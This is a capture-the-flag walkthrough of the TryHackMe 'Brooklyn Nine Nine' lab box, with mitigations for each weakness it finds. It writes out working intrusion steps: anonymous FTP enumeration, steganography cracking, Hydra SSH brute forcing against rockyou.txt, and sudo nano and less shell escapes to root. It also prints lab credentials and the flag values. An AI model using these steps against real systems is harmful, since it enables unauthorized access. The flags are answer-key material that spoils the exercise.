# Brooklyn Nine Nine CTF Walkthrough

**Target:** Brooklyn Nine Nine  
**Source:** [TryHackMe](https://tryhackme.com/room/brooklynninenine)  
**Difficulty:** Easy  
**Target IP:** 10.113.141.100

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Anonymous FTP & Note](#anonymous-ftp--note)
- [Web Enumeration & Steganography](#web-enumeration--steganography)
- [Path A — Holt's Account](#path-a--holts-account)
- [Path B — Jake's Account](#path-b--jakes-account)
- [User Flag](#user-flag)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Brooklyn Nine Nine is an easy Linux box with two intended paths to root. The
objective is to capture the user and root flags. Initial enumeration surfaces
anonymous FTP with a hint, and a steganography clue on the web server that hides
the `holt` SSH password inside an image. From there the box splits:

- **Path A (Holt):** crack the steg image → SSH as `holt` → read the user flag →
  abuse a `sudo nano` rule (GTFOBins) to spawn a root shell.
- **Path B (Jake):** brute force SSH for `jake` with Hydra → abuse a `sudo less`
  rule (GTFOBins) to read root files / spawn a root shell.

Both arrive at the same `root.txt`. This writeup documents both.

**Key Skills Required:**
- Network scanning and service enumeration
- Anonymous FTP enumeration
- Steganography extraction (`stegcracker` / `stegseek`)
- SSH password brute forcing (Hydra)
- Sudo misconfiguration abuse via GTFOBins (`nano`, `less`)

---

## Reconnaissance

### Network Scanning

A version/script scan exposes three services:

```bash
nmap -Pn -sV -sC 10.113.141.100
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 (anonymous login allowed) |
| 22/tcp | ssh | OpenSSH 7.6p1 (Ubuntu) |
| 80/tcp | http | Apache httpd 2.4.29 (Ubuntu) |

Nmap's `ftp-anon` script confirms anonymous FTP and lists a `note_to_jake.txt`
file — an immediate lead.

---

## Anonymous FTP & Note

Logging in anonymously retrieves the note:

```bash
ftp 10.113.141.100
Name: anonymous
230 Login successful.

ftp> more note_to_jake.txt
```

```
From Amy,
Jake please change your password. It is too weak and holt will be mad if
someone hacks into the nine nine
```

The note names two users — `jake` and `holt` — and telegraphs that `jake` has a
weak, brute-forceable password.

---

## Web Enumeration & Steganography

The web root is a single page with a background image and a telling HTML
comment:

```bash
curl http://10.113.141.100
```

```html
<div class="bg"></div>
<!-- Have you ever heard of steganography? -->
```

Download the referenced image and crack the embedded data:

```bash
curl -O http://10.113.141.100/brooklyn99.jpg
stegcracker brooklyn99.jpg /usr/share/wordlists/fasttrack.txt
```

```
Successfully cracked file with password: admin
Your file has been written to: brooklyn99.jpg.out
```

The extracted file reveals Holt's password:

```bash
cat brooklyn99.jpg.out
```

```
Holts Password:
fluffydog12@ninenine
```

> **Recovered credentials:** `holt : fluffydog12@ninenine`

---

## Path A — Holt's Account

SSH in as `holt` with the recovered password:

```bash
ssh holt@10.113.141.100
holt@10.113.141.100's password: fluffydog12@ninenine

holt@brookly_nine_nine:~$ whoami
holt
```

> **Foothold:** `holt`

Check sudo rights:

```bash
holt@brookly_nine_nine:~$ sudo -l
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

`holt` can run `nano` as root without a password. Per
[GTFOBins](https://gtfobins.org/gtfobins/nano/#sudo), open nano with sudo, then
trigger a command from inside the editor:

```bash
holt@brookly_nine_nine:~$ sudo nano
# Inside nano: press Ctrl+R then Ctrl+X, then run:
reset; /bin/bash 1>&0 2>&0
```

A root shell drops:

```bash
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Privilege escalation (Path A):** `holt` → `root` via `sudo nano`

---

## Path B — Jake's Account

The note hinted `jake`'s password is weak. Brute force SSH with Hydra:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.113.141.100
```

```
[22][ssh] host: 10.113.141.100   login: jake   password: 987654321
```

> **Recovered credentials:** `jake : 987654321`

SSH in and check sudo rights:

```bash
ssh jake@10.113.141.100
jake@10.113.141.100's password: 987654321

jake@brookly_nine_nine:~$ sudo -l
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

`jake` can run `less` as root without a password. Per
[GTFOBins](https://gtfobins.org/gtfobins/less/#sudo), `less` can spawn a shell
or read arbitrary files as root. Spawning a shell from within `less`:

```bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
# Inside less, type:
!/bin/bash
```

```bash
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Alternatively, `less` can be used directly to read root-only files such as
`/root/root.txt`.

> **Privilege escalation (Path B):** `jake` → `root` via `sudo less`

---

## User Flag

The user flag is in Holt's home directory:

```bash
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

> **User flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## Root Flag

Either path lands a root shell to read the flag:

```bash
root@brookly_nine_nine:/root# cat root.txt
```

```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```

> **Root flag:** `63a9f0ea7bb98050796b649e85481845`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `ee11cbb19052e40b07aac0ca060c23ee` | `/home/holt/user.txt` |
| Root flag | `63a9f0ea7bb98050796b649e85481845` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Anonymous FTP with Sensitive Note (Medium)

**Description:** vsftpd 3.0.3 allowed anonymous login and exposed
`note_to_jake.txt`, revealing valid usernames and that `jake`'s password was
weak.

**Impact:** Username enumeration and a direct hint enabling Path B.

**Mitigation:**
- Disable anonymous FTP unless required.
- Never leave operational notes/credentials on accessible shares.

### 2. Credentials Hidden via Steganography (High)

**Description:** Holt's SSH password was embedded in `brooklyn99.jpg` and
extractable with a weak passphrase (`admin`) from a small wordlist.

**Impact:** SSH foothold as `holt` (Path A).

**Mitigation:**
- Never embed credentials in publicly served assets.
- Treat all web-hosted files as attacker-accessible.

### 3. Weak SSH Password (High)

**Description:** `jake`'s password (`987654321`) was trivially brute-forceable
from `rockyou.txt`.

**Impact:** SSH foothold as `jake` (Path B).

**Mitigation:**
- Enforce strong password policies and rate limiting / lockout.
- Prefer key-based SSH authentication.

### 4. Sudo nano Misconfiguration (Critical)

**Description:** `holt` could run `/bin/nano` as root with `NOPASSWD`, which
GTFOBins shows can spawn a root shell.

**Impact:** Full privilege escalation to `root`.

**Mitigation:**
- Avoid granting `sudo` on editors/pagers that can execute commands.
- Apply least privilege and audit `sudoers`.

### 5. Sudo less Misconfiguration (Critical)

**Description:** `jake` could run `/usr/bin/less` as root with `NOPASSWD`,
allowing arbitrary file reads and shell escapes via GTFOBins.

**Impact:** Full privilege escalation to `root`.

**Mitigation:**
- Do not grant `sudo` on `less`/pagers; they allow shell escapes.
- Restrict privileged commands to specific, non-interactive binaries.

---

## Attack Chain Summary

```
Nmap scan → 3 open ports (FTP, SSH, HTTP)
    ↓
Anonymous FTP → note_to_jake.txt → users: jake, holt (jake = weak pass)
    ↓
HTTP comment → "steganography" → brooklyn99.jpg
    ↓
            ┌──────────────────────────┬──────────────────────────┐
            │        PATH A            │         PATH B           │
            ↓                          ↓                          
   stegcracker → holt :        hydra ssh → jake : 987654321
   fluffydog12@ninenine                  │
            ↓                            ↓
   ssh holt → user.txt           ssh jake
            ↓                            ↓
   sudo -l: /bin/nano            sudo -l: /usr/bin/less
            ↓                            ↓
   sudo nano → ^R^X →            sudo less → !/bin/bash
   reset; /bin/bash → root       (or read /root/root.txt) → root
            └──────────────┬───────────────┘
                           ↓
            Root flag: 63a9f0ea7bb98050796b649e85481845
                           ↓
                 Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| FTP client | Anonymous login and note retrieval |
| cURL | Reading the web page and downloading the image |
| exiftool | Inspecting image metadata |
| stegcracker / stegseek | Extracting the hidden password from the image |
| Hydra | Brute forcing jake's SSH password |
| ssh | Foothold on both paths |
| GTFOBins (nano, less) | Sudo-based privilege escalation |

---

## References

- [TryHackMe — Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)
- [Nmap](https://nmap.org/)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [StegSeek](https://github.com/RickdeJager/stegseek)
- [GTFOBins — nano](https://gtfobins.org/gtfobins/nano/#sudo)
- [GTFOBins — less](https://gtfobins.org/gtfobins/less/#sudo)

---
